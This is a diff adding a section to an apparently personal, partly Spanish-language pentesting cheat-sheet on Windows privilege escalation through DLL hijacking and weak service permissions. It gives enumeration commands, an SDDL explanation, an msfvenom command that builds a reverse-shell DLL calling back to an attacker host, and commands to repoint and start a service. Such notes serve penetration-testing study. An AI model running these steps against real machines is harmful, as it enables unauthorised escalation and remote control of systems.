@@ -8928,6 +8928,81 @@ Restart-Service <SERVICE>
 Get-LocalGroupMember administrators
 ```
 
+###### DLL Hijacking process
+Winpeas, Installed Applications --Via Program Files registry --
+
+
+List non standard windows services with auto start mode
+
+```c
+wmic service get name,displayname,pathname,startmode
+```
+```c
+Get-ACL 'C:\PATHTOSERVICE' | Format-List
+```
+
+Para no obtener los de System32 y solo los de auto
+
+```c
+wmic service get name,displayname,pathname,startmode  | findstr /i /v "c:\windows"
+```
+
+
+List Services
+
+```c
+sc queryex type=service state=all | find /i "SERVICE_NAME:"
+```
+Se puede start el service ver los permisos sobre el servicio
+
+```c
+sc sdshow SERVICE NAME
+```
+
+With icacls
+
+```c
+ icacls SERVICE_NAME
+```
+Se obtinene un SDDL que es un security descriptor definition languaje
+
+```c
+D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWRPWPLORC;;;WD)
+D → DACL Discretionary Access Control List
+3 parentesis
+(A;;CCLCSWRPWPDTLOCRRC;;;SY) → En la ultima parte son los usuarios → System users
+(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA) → Builtin administrator
+(A;;CCLCSWRPWPLORC;;;WD) → Everyone
+Dentro del parentesis (A;;CCLCSWRPWPLORC;;;WD)
+A things yo are allow
+RP → es que se puede start el servicio
+```
+
+Who is running the service
+
+```c
+sc qc SERVICE_NAME
+cmd /c "sc start monitor1" // in powershell
+```
+
+
+Ver si Localsystem lo corre
+
+```c
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=444 -a x64 -f dll -o Custom.dll
+```
+
+Podemos cambiar el path the ejecucion del servicio
+```c
+sc config SERVICE_NAME binpath="C:\PATH_CON_PERMISOS"
+```
+
+Poner un listener y empezar el servicio
+```c
+ net start SERVICE_NAME
+```
+
+
 ##### Leveraging Windows Services
 
 ###### Running Services Enumeration
